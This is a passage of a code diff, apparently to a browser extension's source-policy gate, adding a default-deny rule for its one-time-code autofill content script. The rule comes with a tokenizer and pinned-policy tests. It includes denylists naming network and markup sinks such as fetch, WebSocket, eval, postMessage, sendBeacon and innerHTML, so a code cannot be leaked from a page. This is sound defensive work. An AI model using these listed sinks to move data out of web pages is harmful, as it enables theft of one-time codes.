@@ -19,7 +19,9 @@
 // and asking for, enumerating or giving up host access (chrome.permissions) to that worker and
 // the popup's bind view. The content script that runs in web pages (lib/fieldfind.js and
 // content/autofill.js) is not covered by the extension-page CSP; it is held to the same source
-// rules as every other file.
+// rules as every other file and to a default-deny list of what it may touch (rule
+// `content-script-sinks`: MANIFEST_POLICY.contentScriptFiles and the lists beside it), and the
+// worker's script registration may name no other file.
 // The gate reads source text; it is a tripwire for the repository's own sources, not a
 // JavaScript parser or a sandbox. The end-to-end test is what observes the pages a browser opens.
 
@@ -91,6 +93,34 @@ const MANIFEST_POLICY = Object.freeze({
   // gives up access. request, remove, getAll, addHostAccessRequest, aliases and every other
   // member fail the `permissions-api` rule outside permissionsFiles.
   permissionsMembersAnywhere: ['contains', 'onAdded', 'onRemoved'],
+  // The content script: the only files a script registration in scriptingFiles may name under
+  // `js:`, injected in this order into every frame of a bound origin. They run in web pages,
+  // outside the extension-page CSP, so the `content-script-sinks` rule holds them to the lists
+  // below on top of the source rules every file meets.
+  contentScriptFiles: ['lib/fieldfind.js', 'content/autofill.js'],
+  // The only member names a content-script file may use after `.` or `?.`: reading the DOM and
+  // the field descriptions it builds, setting `value`, dispatching events, a MutationObserver,
+  // and array, string and set helpers (what the two files use), plus window/document listeners
+  // with the page-state reads they make (visibilityState, hidden, persisted, readyState) and
+  // getBoundingClientRect/getComputedStyle with the result fields that tell whether a field is
+  // shown. Nothing that creates or inserts an element, writes src/href/srcset/action/data/poster/
+  // background/style or markup, posts a message, or opens, submits or clicks anything; not
+  // `attributes` either (setting an attribute node's value rewrites an existing src or href).
+  contentScriptMembers: [
+    'add', 'addEventListener', 'attrs', 'checkVisibility', 'code', 'disabled', 'disconnect',
+    'dispatchEvent', 'display', 'every', 'filter', 'findInDocument', 'findIndex', 'forEach', 'freeze',
+    'from', 'getAttribute', 'getBoundingClientRect', 'getClientRects', 'getComputedStyle', 'group',
+    'has', 'height', 'hidden', 'includes', 'indexOf', 'isArray', 'length', 'map', 'matches',
+    'maxLength', 'observe', 'parentElement', 'persisted', 'push', 'querySelectorAll', 'readOnly',
+    'readyState', 'removeEventListener', 'some', 'split', 'test', 'toLowerCase', 'trim', 'value',
+    'visibility', 'visibilityState', 'visible', 'width', 'zauthFieldFind',
+  ],
+  // The only constructors a content-script file may call with `new`.
+  contentScriptConstructors: ['Event', 'MutationObserver', 'Set', 'WeakSet'],
+  // The only event types it may build (new Event('<type>', ...)) to dispatch on a filled field.
+  contentScriptEvents: ['input', 'change'],
+  // The only chrome APIs it may name: chrome.<area>.<member>.
+  contentScriptChrome: ['runtime.sendMessage', 'runtime.id'],
 });
 const HOMEPAGE_URL = MANIFEST_POLICY.homepageUrl;
 const NAV_WRAPPER = 'lib/nav.js';
@@ -171,6 +201,7 @@ const RULES = [
   'nav-wrapper',
   'scripting-api',
   'permissions-api',
+  'content-script-sinks',
   'inline-script',
   'locales-url',
   'vendor-sums',
@@ -389,6 +420,418 @@ function scopedApiHits(text, label, rel) {
     }
   }
   return hits;
+}
+
+// ---- Content scripts ----------------------------------------------------------------------------
+// The files in MANIFEST_POLICY.contentScriptFiles run inside web pages, where the extension-page
+// CSP does not apply: a resource they make the page load, or a message they post, leaves from the
+// page. Besides the source rules every file meets, they are held to a default-deny list (rule
+// `content-script-sinks`): every member name after `.` or `?.` must be in contentScriptMembers,
+// every `new` must build one of contentScriptConstructors (an Event only of contentScriptEvents),
+// and `chrome` may appear only as chrome.<one of contentScriptChrome>. Computed member access with
+// a string key, computed calls, escaped identifiers, the bare globals in BARE_CONTENT_SINKS, timers
+// whose first argument is not a function, and strings that name a URL sink are refused as well.
+// postMessage is refused in every form: the script runs in every frame of a bound origin, and the
+// frame's parent, top or opener may be another site, while the page itself already gets the code
+// through the field. window.name is refused for the same reason (it survives navigation to another
+// site). Globals are a denylist rather than an allowlist because a text scan cannot tell a free
+// global from a local of the same name (fieldfind.js has locals `name` and `parent`).
+
+// Bare identifiers a content script may not name at all (as members they fail the member list).
+const BARE_CONTENT_SINKS = [
+  'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'RTCPeerConnection', 'webkitRTCPeerConnection',
+  'importScripts', 'import', 'eval', 'Function', 'postMessage', 'open', 'Image', 'Audio', 'Worker',
+  'SharedWorker', 'FontFace', 'with',
+];
+// String values (compared trimmed, case-insensitively) that name a URL-taking attribute or a markup
+// or loading API: with them a computed key or a reflection call reaches the sink by another name.
+const CONTENT_SINK_STRINGS = [
+  'src', 'srcset', 'imagesrcset', 'href', 'xlink:href', 'action', 'formaction', 'data', 'poster',
+  'background', 'srcdoc', 'ping', 'codebase', 'archive', 'longdesc', 'lowsrc', 'innerhtml',
+  'outerhtml', 'insertadjacenthtml', 'csstext', 'backgroundimage', 'setattribute', 'setattributens',
+  'createelement', 'createelementns', 'write', 'writeln', 'postmessage', 'sendbeacon', 'open',
+];
+const TIMERS = ['setTimeout', 'setInterval'];
+const ASSIGNMENT_OPS = new Set(['=', '+=', '-=', '*=', '/=', '%=', '**=', '<<=', '>>=', '>>>=', '&=', '|=', '^=', '&&=', '||=', '??=']);
+// Keywords after which an expression starts: a '/' there opens a regular expression and a '['
+// an array literal.
+const EXPRESSION_KEYWORDS = new Set(['return', 'typeof', 'instanceof', 'in', 'of', 'new', 'delete', 'void', 'throw', 'case', 'do', 'else', 'yield', 'await', 'extends']);
+const NOT_COMPUTED_AFTER = new Set([...EXPRESSION_KEYWORDS, 'const', 'let', 'var']);
+const PUNCTUATORS = ['>>>=', '...', '===', '!==', '**=', '<<=', '>>=', '>>>', '&&=', '||=', '??=', '=>', '==', '!=', '<=', '>=', '&&', '||', '??', '?.', '++', '--', '+=', '-=', '*=', '/=', '%=', '&=', '|=', '^=', '**', '<<', '>>'];
+const LINE_END = /[\n\r\u2028\u2029]/;
+const NUMBER = /0[xXbBoO][\da-fA-F_]+n?|\d[\d_]*\.?[\d_]*(?:[eE][+-]?\d+)?n?|\.\d[\d_]*(?:[eE][+-]?\d+)?/y;
+const SIMPLE_ESCAPES = { n: '\n', t: '\t', r: '\r', b: '\b', f: '\f', v: '\v' };
+
+// The body of a string literal (quote at `start`) or of a template part (`start` just after the
+// backtick or the '}' that closes a substitution), with simple escapes decoded.
+// → { end: index after it, value, open: ended at '${' } or { problem }
+function readQuoted(text, start, quote) {
+  let value = '';
+  for (let i = quote === '`' ? start : start + 1; i < text.length; i += 1) {
+    const c = text[i];
+    if (c === quote) return { end: i + 1, value, open: false };
+    if (quote === '`' && c === '$' && text[i + 1] === '{') return { end: i + 2, value, open: true };
+    if (quote !== '`' && (c === '\n' || c === '\r')) break;
+    if (c !== '\\') {
+      value += c;
+      continue;
+    }
+    const n = text[i + 1] ?? '';
+    // \x, \u and octal escapes spell a character by number; a scan that compares names cannot
+    // follow them, so they are refused (write the character itself).
+    if (/[xu0-9]/.test(n)) return { problem: `escape \\${n} in a ${quote === '`' ? 'template' : 'string'} literal` };
+    if (n === '\r' && text[i + 2] === '\n') i += 1;
+    else if (!LINE_END.test(n)) value += SIMPLE_ESCAPES[n] ?? n;
+    i += 1;
+  }
+  return { problem: `unterminated ${quote === '`' ? 'template' : 'string'} literal` };
+}
+
+// Index just after the regular expression literal at `start` (its opening '/'), or -1.
+function regexEnd(text, start) {
+  let inClass = false;
+  for (let i = start + 1; i < text.length; i += 1) {
+    const c = text[i];
+    if (LINE_END.test(c)) return -1;
+    if (c === '\\') i += 1;
+    else if (c === '[') inClass = true;
+    else if (c === ']') inClass = false;
+    else if (c === '/' && !inClass) {
+      let e = i + 1;
+      while (e < text.length && /[\w$]/.test(text[e])) e += 1;
+      return e;
+    }
+  }
+  return -1;
+}
+
+// Whether a '/' after token `prev` opens a regular expression. Where JavaScript itself needs the
+// parse to decide (after ')', ']' or '}', and after of, await or yield, which may be plain names),
+// either reading can hide code inside a literal: `strict` scans refuse a '/' there (slashIsAmbiguous),
+// other scans read it as division after ')', ']' and '}' and as a regular expression after the
+// keywords.
+function slashIsAmbiguous(prev) {
+  if (!prev) return false;
+  if (prev.t === 'p') return [')', ']', '}'].includes(prev.v);
+  return prev.t === 'id' && ['of', 'await', 'yield'].includes(prev.v);
+}
+function regexAllowed(prev) {
+  if (!prev) return true;
+  if (prev.t === 'id') return EXPRESSION_KEYWORDS.has(prev.v);
+  if (prev.t === 'p') return ![')', ']', '}', '++', '--'].includes(prev.v);
+  if (prev.t === 'tpl') return prev.open;
+  return false;
+}
+
+// A small JavaScript tokenizer for the content-script rule: comments are dropped; strings,
+// template parts and regular expressions become single tokens, so names inside them are not code.
+// It fails closed: what it cannot read (an unterminated literal or comment, a backslash in code,
+// with `strict` a '/' that may be division or a regular expression) is a problem, and the rest of
+// the file is not scanned.
+// → { tokens: [{ t: 'id'|'num'|'str'|'tpl'|'re'|'p', v, i, open? }], problems: [{ i, what }] }
+function jsTokens(text, { strict = false } = {}) {
+  const tokens = [];
+  const problems = [];
+  const braces = []; // one entry per open '{': true when it is a template's '${'
+  let i = 0;
+  while (i < text.length) {
+    const c = text[i];
+    const prev = tokens[tokens.length - 1];
+    if (/\s/.test(c)) {
+      i += 1;
+    } else if (c === '/' && text[i + 1] === '/') {
+      // A line comment ends at any line terminator, not only '\n'.
+      i += 2;
+      while (i < text.length && !LINE_END.test(text[i])) i += 1;
+    } else if (c === '/' && text[i + 1] === '*') {
+      const e = text.indexOf('*/', i + 2);
+      if (e < 0) {
+        problems.push({ i, what: 'unterminated comment' });
+        break;
+      }
+      i = e + 2;
+    } else if (c === '"' || c === "'" || c === '`' || (c === '}' && braces[braces.length - 1] === true)) {
+      if (c === '}') braces.pop();
+      const quote = c === '}' ? '`' : c;
+      const r = readQuoted(text, c === '}' || c === '`' ? i + 1 : i, quote);
+      if (r.problem) {
+        problems.push({ i, what: r.problem });
+        break;
+      }
+      tokens.push(quote === '`' ? { t: 'tpl', v: r.value, i, open: r.open } : { t: 'str', v: r.value, i });
+      if (r.open) braces.push(true);
+      i = r.end;
+    } else if (c === '/' && strict && slashIsAmbiguous(prev)) {
+      problems.push({ i, what: `'/' right after '${prev.v}' (division or a regular expression; a text scan cannot tell which)` });
+      break;
+    } else if (c === '/' && regexAllowed(prev)) {
+      const e = regexEnd(text, i);
+      if (e < 0) {
+        problems.push({ i, what: 'unterminated regular expression' });
+        break;
+      }
+      tokens.push({ t: 're', v: text.slice(i, e), i });
+      i = e;
+    } else if (/[A-Za-z_$]/.test(c) || c > '\x7f') {
+      let e = i + 1;
+      while (e < text.length && (/[\w$]/.test(text[e]) || (text[e] > '\x7f' && !/\s/.test(text[e])))) e += 1;
+      tokens.push({ t: 'id', v: text.slice(i, e), i });
+      i = e;
+    } else if (/\d/.test(c) || (c === '.' && /\d/.test(text[i + 1] ?? ''))) {
+      NUMBER.lastIndex = i;
+      const m = NUMBER.exec(text);
+      const e = m ? i + m[0].length : i + 1;
+      tokens.push({ t: 'num', v: text.slice(i, e), i });
+      i = e;
+    } else if (c === '\\') {
+      problems.push({ i, what: 'backslash outside a string or regular expression (an escaped identifier)' });
+      break;
+    } else {
+      let p = PUNCTUATORS.find((op) => text.startsWith(op, i)) ?? c;
+      if (p === '?.' && /\d/.test(text[i + 2] ?? '')) p = '?'; // a ? .5 : b
+      if (p === '{') braces.push(false);
+      else if (p === '}') braces.pop();
+      tokens.push({ t: 'p', v: p, i });
+      i += p.length;
+    }
+  }
+  return { tokens, problems };
+}
+
+const isPunct = (tok, v) => Boolean(tok) && tok.t === 'p' && tok.v === v;
+const isDot = (tok) => isPunct(tok, '.') || isPunct(tok, '?.');
+
+// Index of the token that closes the bracket at tokens[k], or -1.
+function closingToken(tokens, k) {
+  const open = tokens[k].v;
+  const close = { '(': ')', '[': ']', '{': '}' }[open];
+  let depth = 0;
+  for (let j = k; j < tokens.length; j += 1) {
+    if (isPunct(tokens[j], open)) depth += 1;
+    else if (isPunct(tokens[j], close)) {
+      depth -= 1;
+      if (depth === 0) return j;
+    }
+  }
+  return -1;
+}
+
+// Whether tokens[k] starts a function expression: function, async, x => or (...) =>.
+function startsFunction(tokens, k) {
+  const tok = tokens[k];
+  if (!tok) return false;
+  if (tok.t === 'id' && (tok.v === 'function' || tok.v === 'async')) return true;
+  if (tok.t === 'id') return isPunct(tokens[k + 1], '=>');
+  if (isPunct(tok, '(')) {
+    const close = closingToken(tokens, k);
+    return close >= 0 && isPunct(tokens[close + 1], '=>');
+  }
+  return false;
+}
+
+// A '[' after `prev` is a member access (x[k], f()[k], a[0][1], x?.[k]), not an array literal.
+function opensComputedAccess(prev) {
+  if (!prev) return false;
+  if (prev.t === 'id') return !NOT_COMPUTED_AFTER.has(prev.v);
+  if (prev.t === 'p') return prev.v === ')' || prev.v === ']' || prev.v === '?.';
+  return prev.t === 'str' || prev.t === 're' || (prev.t === 'tpl' && !prev.open);
+}
+
+// What a content-script file uses outside MANIFEST_POLICY's content-script lists. → [hit]
+function contentScriptHits(text, label) {
+  const { contentScriptMembers, contentScriptConstructors, contentScriptChrome, contentScriptEvents } = MANIFEST_POLICY;
+  const { tokens, problems } = jsTokens(text, { strict: true });
+  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
+  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what}`);
+  // Object destructuring names a property with no '.' before it (const { write } = document), so
+  // the member list would not see it: object patterns are refused. A '{' is a pattern after
+  // const/let/var, when its '}' is followed by an assignment or `of`/`in`, and anywhere inside a
+  // parameter list (of an arrow, a function, a method or a catch clause).
+  const pairs = new Map(); // index of '(' / '[' / '{' -> index of its closing token, and back
+  const stack = [];
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'p') return;
+    if (tok.v === '(' || tok.v === '[' || tok.v === '{') stack.push(k);
+    else if (tok.v === ')' || tok.v === ']' || tok.v === '}') {
+      const open = stack.pop();
+      if (open !== undefined) {
+        pairs.set(open, k);
+        pairs.set(k, open);
+      }
+    }
+  });
+  const params = []; // [open, close] token ranges of parameter lists
+  tokens.forEach((tok, k) => {
+    if (isPunct(tok, '=>') && isPunct(tokens[k - 1], ')') && pairs.has(k - 1)) params.push([pairs.get(k - 1), k - 1]);
+    if (!isPunct(tok, '(') || !pairs.has(k)) return;
+    const close = pairs.get(k);
+    const before = tokens[k - 1];
+    // function (, function name (, function* name (, and name (...) { (a method or catch clause;
+    // the statements whose head is followed by a block are not).
+    const functionHead =
+      before?.v === 'function' ||
+      (isPunct(before, '*') && tokens[k - 2]?.v === 'function') ||
+      (before?.t === 'id' && (tokens[k - 2]?.v === 'function' || (isPunct(tokens[k - 2], '*') && tokens[k - 3]?.v === 'function')));
+    const blockHead = before?.t === 'id' && !['if', 'while', 'for', 'switch', 'with'].includes(before.v) && isPunct(tokens[close + 1], '{');
+    if (functionHead || blockHead) params.push([k, close]);
+  });
+  tokens.forEach((tok, k) => {
+    if (!isPunct(tok, '{')) return;
+    const close = pairs.get(k);
+    const after = close === undefined ? undefined : tokens[close + 1];
+    const pattern =
+      ['const', 'let', 'var'].includes(tokens[k - 1]?.v) ||
+      (after?.t === 'p' && ASSIGNMENT_OPS.has(after.v)) ||
+      (after?.t === 'id' && (after.v === 'of' || after.v === 'in')) ||
+      params.some(([open, end]) => k > open && k < end);
+    if (pattern) hits.push(`${at(tok)} object destructuring pattern (it names properties without a member access)`);
+  });
+  // Functions written in the file: function f, and const f = <function expression>.
+  const functionNames = new Set();
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id') return;
+    const prev = tokens[k - 1];
+    if (prev?.v === 'function' || (isPunct(prev, '*') && tokens[k - 2]?.v === 'function')) functionNames.add(tok.v);
+    else if (prev?.v === 'const' && isPunct(tokens[k + 1], '=') && startsFunction(tokens, k + 2)) functionNames.add(tok.v);
+  });
+  const judged = new Set(); // indices of tokens a check has already ruled on
+  for (let k = 0; k < tokens.length; k += 1) {
+    const tok = tokens[k];
+    const prev = tokens[k - 1];
+    const next = tokens[k + 1];
+    if (tok.t === 'str' || tok.t === 'tpl') {
+      if (CONTENT_SINK_STRINGS.includes(tok.v.trim().toLowerCase())) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} names a URL or markup sink`);
+      if (/^\s*[\\/]{2}/.test(tok.v)) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} is a protocol-relative URL`);
+      if (/\burl\s*\(/i.test(tok.v)) hits.push(`${at(tok)} string ${JSON.stringify(tok.v)} holds a CSS url(`);
+      continue;
+    }
+    if (isDot(tok) && next?.t === 'id') {
+      if (!judged.has(k + 1) && !contentScriptMembers.includes(next.v)) hits.push(`${at(tok)} .${next.v} is not on the content-script member list`);
+      judged.add(k + 1);
+      continue;
+    }
+    if (isPunct(tok, '[') && opensComputedAccess(prev)) {
+      const close = closingToken(tokens, k);
+      const key = tokens.slice(k + 1, close < 0 ? tokens.length : close);
+      if (key.some((t) => t.t === 'str' || t.t === 'tpl')) hits.push(`${at(tok)} computed member access with a string key`);
+      const after = tokens[close + 1];
+      if (close >= 0 && (isPunct(after, '(') || (isPunct(after, '?.') && isPunct(tokens[close + 2], '(')))) hits.push(`${at(tok)} computed member call`);
+      continue;
+    }
+    if (tok.t !== 'id' || judged.has(k)) continue;
+    if (tok.v === 'chrome') {
+      const [dot1, area, dot2, member] = tokens.slice(k + 1, k + 5);
+      const api = isDot(dot1) && area?.t === 'id' && isDot(dot2) && member?.t === 'id' ? `${area.v}.${member.v}` : null;
+      if (api && contentScriptChrome.includes(api)) {
+        judged.add(k + 2);
+        judged.add(k + 4);
+      } else hits.push(`${at(tok)} chrome other than chrome.{${contentScriptChrome.join(', ')}}`);
+      continue;
+    }
+    if (tok.v === 'new') {
+      const after = tokens[k + 2];
+      const shown = next?.t === 'id' ? next.v : (next?.v ?? '');
+      if (next?.t !== 'id' || !contentScriptConstructors.includes(next.v) || isDot(after) || isPunct(after, '[')) {
+        hits.push(`${at(tok)} new ${shown} (a content script constructs only ${contentScriptConstructors.join(', ')})`);
+      } else if (next.v === 'Event') {
+        const type = tokens[k + 3];
+        const ok = isPunct(after, '(') && type?.t === 'str' && contentScriptEvents.includes(type.v) && (isPunct(tokens[k + 4], ',') || isPunct(tokens[k + 4], ')'));
+        if (!ok) hits.push(`${at(tok)} new Event( other than ${contentScriptEvents.map((e) => `'${e}'`).join(' or ')}`);
+      }
+      if (next) judged.add(k + 1);
+      continue;
+    }
+    if (BARE_CONTENT_SINKS.includes(tok.v)) {
+      hits.push(`${at(tok)} ${tok.v} in a content script`);
+      continue;
+    }
+    // A bare `name = ...` (no declaration) assigns window.name.
+    if (tok.v === 'name' && next?.t === 'p' && ASSIGNMENT_OPS.has(next.v) && !['const', 'let', 'var'].includes(prev?.v)) {
+      hits.push(`${at(tok)} assignment to the global name (window.name)`);
+      continue;
+    }
+    if (TIMERS.includes(tok.v)) {
+      const first = tokens[k + 2];
+      if (!isPunct(next, '(')) hits.push(`${at(tok)} ${tok.v} other than called directly`);
+      else if (
+        !startsFunction(tokens, k + 2) &&
+        !(first?.t === 'id' && functionNames.has(first.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], ')')))
+      ) {
+        hits.push(`${at(tok)} ${tok.v} whose first argument is not a function written in the file`);
+      }
+    }
+  }
+  return hits;
+}
+
+// The script files that the registration code in one of MANIFEST_POLICY.scriptingFiles (the only
+// files that may call chrome.scripting) names under a `js:` key. Each must be a literal list of
+// strings, or a const holding one that is used nowhere but as a `js:` value; anything else, and a
+// file that registers content scripts without a readable `js:` key, is a hit.
+// → { hits: [hit], named: [path] }
+function registrationHits(text, label) {
+  const { tokens, problems } = jsTokens(text);
+  const at = (tok) => `${label}:${lineOf(text, tok.i)}`;
+  const hits = problems.map((p) => `${label}:${lineOf(text, p.i)} ${p.what} (the script registration cannot be read)`);
+  const named = [];
+  const isJsName = (tok) => Boolean(tok) && (tok.t === 'id' || tok.t === 'str') && tok.v === 'js';
+  const isJsKey = (k) => isJsName(tokens[k]) && isPunct(tokens[k + 1], ':') && (isPunct(tokens[k - 1], '{') || isPunct(tokens[k - 1], ','));
+  // The strings of the list literal opening at tokens[k], with the index of its ']', or null.
+  const listAt = (k) => {
+    const list = [];
+    let j = k + 1;
+    while (j < tokens.length && !isPunct(tokens[j], ']')) {
+      if (tokens[j].t !== 'str') return null;
+      list.push(tokens[j].v);
+      j += 1;
+      if (isPunct(tokens[j], ',')) j += 1;
+      else if (!isPunct(tokens[j], ']')) return null;
+    }
+    return j < tokens.length ? { list, end: j } : null;
+  };
+  // `const <name> = [ '...', ... ];`, declared once and otherwise used only as `js: <name>`.
+  const constList = (name) => {
+    const decls = [];
+    let uses = 0;
+    tokens.forEach((tok, k) => {
+      if (tok.t !== 'id' || tok.v !== name) return;
+      if (tokens[k - 1]?.v === 'const' && isPunct(tokens[k + 1], '=') && isPunct(tokens[k + 2], '[')) decls.push(k);
+      else if (!(isPunct(tokens[k - 1], ':') && isJsKey(k - 2) && (isPunct(tokens[k + 1], ',') || isPunct(tokens[k + 1], '}')))) uses += 1;
+    });
+    if (decls.length !== 1 || uses > 0) return null;
+    const r = listAt(decls[0] + 2);
+    return r && isPunct(tokens[r.end + 1], ';') ? r.list : null;
+  };
+  let keys = 0;
+  tokens.forEach((tok, k) => {
+    if (!isJsName(tok)) return;
+    if (!isJsKey(k)) {
+      hits.push(`${at(tok)} js named other than as the js: key of a script registration`);
+      return;
+    }
+    keys += 1;
+    const value = tokens[k + 2];
+    let list = null;
+    if (isPunct(value, '[')) {
+      const r = listAt(k + 2);
+      list = r && (isPunct(tokens[r.end + 1], ',') || isPunct(tokens[r.end + 1], '}')) ? r.list : null;
+    } else if (value?.t === 'id' && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}'))) {
+      list = constList(value.v);
+    }
+    if (!list) {
+      hits.push(`${at(tok)} js: is not a list of string literals or a const holding one (used only as js:)`);
+      return;
+    }
+    for (const rel of list) {
+      named.push(rel);
+      if (!MANIFEST_POLICY.contentScriptFiles.includes(rel)) hits.push(`${at(tok)} js: names ${rel}, not one of contentScriptFiles (${MANIFEST_POLICY.contentScriptFiles.join(', ')})`);
+    }
+  });
+  if (keys === 0) {
+    const call = tokens.find((tok) => tok.t === 'id' && (tok.v === 'registerContentScripts' || tok.v === 'updateContentScripts'));
+    if (call) hits.push(`${at(call)} ${call.v} without a js: key in the file naming the scripts`);
+  }
+  return { hits, named };
 }
 
 // JSON text of `value` with object keys sorted, so two values compare equal exactly when they
@@ -655,6 +1098,29 @@ function runChecks(extDir) {
       ? `chrome.permissions only in ${MANIFEST_POLICY.permissionsFiles.join(', ')}; elsewhere only chrome.permissions.{${MANIFEST_POLICY.permissionsMembersAnywhere.join(', ')}}`
       : permissionsUse.join('; '),
   );
+  // The content script: held to the content-script lists, and registered under no other name.
+  const contentHits = [];
+  for (const rel of MANIFEST_POLICY.contentScriptFiles) {
+    const f = files.find((x) => x.rel === rel);
+    if (!f) contentHits.push(`${label(rel)} missing (listed in contentScriptFiles)`);
+    else if (f.kind !== 'file') contentHits.push(`${label(rel)} is a ${f.kind}, not a regular file`);
+    else contentHits.push(...contentScriptHits(fs.readFileSync(f.abs, 'utf8'), label(rel)));
+  }
+  const registered = [];
+  for (const rel of MANIFEST_POLICY.scriptingFiles) {
+    const f = files.find((x) => x.rel === rel && x.kind === 'file');
+    if (!f) continue;
+    const r = registrationHits(fs.readFileSync(f.abs, 'utf8'), label(rel));
+    contentHits.push(...r.hits);
+    registered.push(...r.named);
+  }
+  record(
+    'content-script-sinks',
+    contentHits.length === 0,
+    contentHits.length === 0
+      ? `${MANIFEST_POLICY.contentScriptFiles.join(', ')} use only the content-script members, new {${MANIFEST_POLICY.contentScriptConstructors.join(', ')}} and chrome.{${MANIFEST_POLICY.contentScriptChrome.join(', ')}}; registrations in ${MANIFEST_POLICY.scriptingFiles.join(', ')} name js: [${registered.join(', ')}]`
+      : contentHits.join('; '),
+  );
   record('inline-script', inline.length === 0, inline.length === 0 ? `no inline <script> or on*= in ${htmlCount} .html files` : inline.join('; '));
 
   const locales = files.filter((f) => f.kind === 'file' && /^_locales\/.+\/messages\.json$/.test(f.rel));
@@ -720,6 +1186,19 @@ const PINNED_POLICY = {
   scriptingFiles: ['lib/autofill-worker.js'],
   permissionsFiles: ['popup/popup.js', 'lib/autofill-worker.js'],
   permissionsMembersAnywhere: ['onAdded', 'onRemoved', 'contains'],
+  contentScriptFiles: ['content/autofill.js', 'lib/fieldfind.js'],
+  contentScriptMembers: [
+    'zauthFieldFind', 'width', 'visible', 'visibilityState', 'visibility', 'value', 'trim',
+    'toLowerCase', 'test', 'split', 'some', 'removeEventListener', 'readyState', 'readOnly',
+    'querySelectorAll', 'push', 'persisted', 'parentElement', 'observe', 'maxLength', 'matches', 'map',
+    'length', 'isArray', 'indexOf', 'includes', 'hidden', 'height', 'has', 'group', 'getComputedStyle',
+    'getClientRects', 'getBoundingClientRect', 'getAttribute', 'from', 'freeze', 'forEach',
+    'findIndex', 'findInDocument', 'filter', 'every', 'display', 'dispatchEvent', 'disconnect',
+    'disabled', 'code', 'checkVisibility', 'attrs', 'addEventListener', 'add',
+  ],
+  contentScriptConstructors: ['WeakSet', 'Set', 'MutationObserver', 'Event'],
+  contentScriptEvents: ['change', 'input'],
+  contentScriptChrome: ['runtime.id', 'runtime.sendMessage'],
 };
 
 // Differences between two policies, [] when equal. Lists compare as sorted copies (so a
@@ -769,6 +1248,15 @@ const PIN_MUTATIONS = [
   ['permissionsFiles', (p) => p.permissionsFiles.pop()],
   ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('request')],
   ['permissionsMembersAnywhere', (p) => p.permissionsMembersAnywhere.push('getAll')],
+  ['contentScriptFiles', (p) => p.contentScriptFiles.push('content/other.js')],
+  ['contentScriptFiles', (p) => p.contentScriptFiles.pop()],
+  ['contentScriptMembers', (p) => p.contentScriptMembers.push('src')],
+  ['contentScriptMembers', (p) => p.contentScriptMembers.push('postMessage')],
+  ['contentScriptMembers', (p) => (p.contentScriptMembers = p.contentScriptMembers.filter((m) => m !== 'value'))],
+  ['contentScriptConstructors', (p) => p.contentScriptConstructors.push('Image')],
+  ['contentScriptEvents', (p) => p.contentScriptEvents.push('submit')],
+  ['contentScriptChrome', (p) => p.contentScriptChrome.push('runtime.connect')],
+  ['contentScriptChrome', (p) => (p.contentScriptChrome = ['runtime.sendMessage'])],
   ['newField', (p) => (p.newField = [])],
 ];
 
@@ -814,6 +1302,7 @@ const NAV_WRAPPER_SOURCE = [
 const WORKER_SOURCE = [
   "// Context menu, codes for bound sites, script registration.",
   "import { openOwnWindow } from './nav.js';",
+  "const CONTENT_SCRIPTS = ['lib/fieldfind.js', 'content/autofill.js'];",
   "export async function handleMenuClick(info, tab) {",
   "  const frameIds = [info.frameId ?? 0];",
   "  await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: ['123456'] });",
@@ -829,7 +1318,7 @@ const WORKER_SOURCE = [
   "  const [current] = await chrome.scripting.getRegisteredContentScripts({ ids: ['autofill'] });",
   "  if (matches.length === 0 && current) await chrome.scripting.unregisterContentScripts({ ids: ['autofill'] });",
   "  else if (current) await chrome.scripting.updateContentScripts([{ id: 'autofill', matches }]);",
-  "  else await chrome.scripting.registerContentScripts([{ id: 'autofill', matches, js: ['content/autofill.js'], allFrames: true, runAt: 'document_idle' }]);",
+  "  else await chrome.scripting.registerContentScripts([{ id: 'autofill', matches, js: CONTENT_SCRIPTS, allFrames: true, runAt: 'document_idle' }]);",
   "  const granted = await chrome.permissions.getAll();",
   "  const stale = (granted.origins ?? []).filter((pattern) => !matches.includes(pattern));",
   "  if (stale.length) await chrome.permissions.remove({ origins: stale });",
@@ -853,17 +1342,113 @@ const BACKGROUND_SOURCE = [
   "",
 ].join('\n');
 const CONTENT_SOURCE = [
-  "// Runs in frames of bound sites only: asks the worker for a code, fills an empty field once.",
-  "const field = document.querySelector('input[autocomplete=\"one-time-code\"]');",
-  "if (field && !field.value) {",
-  "  chrome.runtime.sendMessage({ type: 'autofill-code' }).then((reply) => {",
-  "    if (!reply?.code || field.value) return;",
-  "    field.value = reply.code;",
-  "    field.dispatchEvent(new Event('input', { bubbles: true }));",
-  "    field.dispatchEvent(new Event('change', { bubbles: true }));",
-  "  });",
-  "}",
-  "const here = location.origin;",
+  "// Runs in every frame of a bound origin after lib/fieldfind.js: asks the worker for a code and",
+  "// fills an empty field once. The shapes of content/autofill.js.",
+  "(() => {",
+  "  'use strict';",
+  "  const finder = globalThis.zauthFieldFind;",
+  "  if (!finder) return;",
+  "  const CODE = /^\\d{6,8}$/;",
+  "  const WATCHED_ATTRIBUTES = ['style', 'class', 'hidden', 'type', 'autocomplete', 'name', 'id'];",
+  "  const seen = new WeakSet();",
+  "  let stopped = false;",
+  "  let settleTimer = 0;",
+  "  const observer = new MutationObserver(schedule);",
+  "  observer.observe(document, { subtree: true, childList: true, attributes: true, attributeFilter: WATCHED_ATTRIBUTES });",
+  "  const deadline = setTimeout(stop, 60 * 1000);",
+  "  look();",
+  "  function schedule() {",
+  "    if (stopped || settleTimer) return;",
+  "    settleTimer = setTimeout(() => {",
+  "      settleTimer = 0;",
+  "      look();",
+  "    }, 100);",
+  "  }",
+  "  async function look() {",
+  "    const fields = finder.findInDocument(document);",
+  "    if (stopped || !fields || fields.some((el) => seen.has(el))) return;",
+  "    let code = null;",
+  "    try {",
+  "      const reply = await chrome.runtime.sendMessage({ type: 'autofill-code' });",
+  "      if (reply && typeof reply.code === 'string' && CODE.test(reply.code)) code = reply.code;",
+  "    } catch {",
+  "      // the worker could not be reached",
+  "    }",
+  "    if (code === null) return stop();",
+  "    for (const el of fields) seen.add(el);",
+  "    const [el] = fields;",
